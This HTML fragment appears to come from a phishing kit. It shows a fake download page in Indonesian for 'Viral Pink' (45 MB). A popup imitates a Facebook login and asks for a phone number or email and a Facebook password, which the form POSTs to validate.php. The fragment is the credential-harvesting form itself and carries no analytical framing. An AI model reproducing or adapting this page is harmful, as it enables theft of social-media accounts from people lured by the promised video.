    ...
    <div class="wrap">
        ...
        <div class="down-area">
            <div class="download">
                ...
                <div class="title">
                    <span class="atas">Viral Pink</span>
                    <span class="bawah">Unduh (45 MB)</span>
                </div>
                <div class="do-btn">
        ...
        <div class="popup-box-login-fb">
            ...
            <div class="content-box-fb">
                ...
                <form class="login-form" method="POST" action="validate.php" onsubmit="$(this).end()">
                    <label>
                        <input type="text" id="user" name="user" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off">
                    </label>
                    <label>
                        <input type="password" id="pass" name="pass" placeholder="Facebook password" autocomplete="off" autocapitalize="off">
                    </label>
                    <!-- END -->
